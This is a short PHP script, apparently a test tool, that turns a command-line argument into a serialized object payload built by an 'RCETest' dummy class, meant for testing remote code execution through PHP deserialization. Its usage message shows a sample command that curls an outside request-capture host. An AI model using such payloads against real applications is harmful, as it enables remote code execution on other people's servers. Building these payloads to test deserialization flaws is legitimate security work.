<?php

require __DIR__.'/rce-dummy.php';

if (empty($argv[1])) {
    echo "Please specify a command you want to run. Example:\n";
    echo "php -dphar.readonly=0 gen-dump-serialized.php 'curl xxx.free.beeceptor.com/foo'\n";
    exit(1);
}

$dummy = \RCETest\makeDummy($argv[1]);
echo serialize($dummy);
